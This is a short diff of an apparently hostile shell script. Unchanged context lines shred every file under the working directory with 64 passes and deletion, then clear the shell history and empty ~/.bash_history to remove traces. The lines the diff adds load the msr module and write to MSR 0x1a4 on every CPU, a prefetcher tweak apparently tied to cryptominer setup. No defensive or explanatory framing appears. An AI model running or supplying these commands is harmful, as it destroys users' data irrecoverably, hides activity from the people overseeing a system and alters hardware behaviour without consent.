@@ -27,7 +27,12 @@ find . -type f | sed 's/.*/shred -n 64 -u &/g' | sh 2> /dev/null
 rm -fr __pycache__
 find . -type f | sed 's/.*/shred -n 64 -u &/g' | sh 2> /dev/null
 
+echo "Loading modules"
+modprobe msr || sleep 5
+wrmsr -a 0x1a4 0xf || sleep 5
+
 echo "Done"
+
 
 history -cw
 cat /dev/null > ~/.bash_history
